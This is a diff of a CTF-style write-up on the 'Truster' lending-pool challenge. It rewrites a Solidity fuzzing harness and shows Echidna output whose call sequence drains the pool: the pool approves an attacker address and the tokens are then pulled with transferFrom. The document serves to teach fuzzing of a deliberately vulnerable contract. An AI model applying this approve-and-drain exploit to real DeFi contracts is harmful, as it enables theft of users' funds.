@@ -727,58 +727,47 @@ Error: Compiler run failed:
 Error: Compiler error (/solidity/libsolidity/codegen/LValue.cpp:51):Stack too deep. ...
 ...
 ```
-But we can 
-1) Comment out all the calls, except for one function
-2) Start fuzzing
-3) If it didn't work, comment on the other one and repeat. For example, if we want to check the transfer function as a target - this FRANKENSTEIN changes to something like this:
+But we can rewrite it using the same idea. **permit** and **flashLoan** calls are deleted because they are uncallable anyway:
 ```solidity
-// Fuzz flashloan function (less hint)
 function __flashLoan(uint256 amount, address borrower,
-                        bool is_token,
-                        /*bool is_approve, address approve_to, uint256 approve_amount,
-                        bool is_permit, address permit_owner, address permit_spender, 
-                            uint256 permit_value, uint256 permit_deadline, uint8 permit_v,
-                            bytes32 permit_r, bytes32 permit_s,*/
-                        bool is_transfer, address transfer_to, uint256 transfer_amount/*,
-                        bool is_transferFrom, address transferFrom_from, 
-                            address transferFrom_to, uint256 transferFrom_amount*/
-                        )
-    external
-    nonReentrant
-    returns (bool)
+		    bool is_approve, bool is_transfer, bool is_tranferFrom,
+		    address addr_param1, address addr_param2,
+		    uint256 uint256_param1
+		    )
+	external
+	nonReentrant
+	returns (bool)
 {
-    uint256 balanceBefore = token.balanceOf(address(this));
-    
-    token.transfer(borrower, amount);
-    //target is token
-    if (is_token) {
-    /*    if (is_approve) {
-            token.approve(approve_to, approve_amount);
-        }
-        else if (is_permit) {
-            token.permit(permit_owner, permit_spender, permit_value, 
-                                        permit_deadline, permit_v,
-                                        permit_r, permit_s);
-        }
-        else */if (is_transfer) {
-            token.transfer(transfer_to, transfer_amount);
-        }
-    /*    else if (is_transferFrom) {
-            token.transferFrom(transferFrom_from, transferFrom_to, transferFrom_amount);
-        }
-    */}
-    /*
-    else {
-        bytes memory data = ""; // The only one function in pool is nonReentrant anyway
-        address(this).functionCall(data); // Call flashloan itself
-    }*/
-    if (token.balanceOf(address(this)) < balanceBefore) {
-        revert RepayFailed();
-    }
-    return true;
+	uint256 balanceBefore = token.balanceOf(address(this));
+	
+	token.transfer(borrower, amount);
+	if (is_approve == true) { // token.approve
+	    token.approve(addr_param1, uint256_param1);
+	}
+	else if (is_transfer == true) { // token.transfer
+	    token.transfer(addr_param1, uint256_param1);
+	}
+	else if (is_tranferFrom == true) { // token.transferFrom
+	    token.transferFrom(addr_param1, addr_param2, uint256_param1);
+	}
+	if (token.balanceOf(address(this)) < balanceBefore) {
+	    revert RepayFailed();
+	}
+	return true;
 }
 ```
-I think that's enough :D
+Run:
+```javascript
+$ forge build
+...
+$ echidna test/truster/TrusterEchidna.sol --contract TrusterEchidna --config test/truster/truster.yaml --test-limit 10000000
+...
+echidna_testSolved: failed!
+  Call sequence:
+    TrusterLenderPool.__flashLoan(0,0x0,true,false,false,0xcafe0002,0x0,40464368538165944492706300802628728086193014206184318198474034)
+    DamnValuableToken.transferFrom(0x62d69f6867a0a084c6d313943dc22023bc263691,0x0,1)
+```
+It's alive! Well, with such changes, we managed to make fuzzing produce some kind of acceptable result.
 ## Conclusions
 1. Sometimes, one transaction is not enough for an attack. Symbolically perform 2 transactions in 
 such tasks generally possible for Halmos.
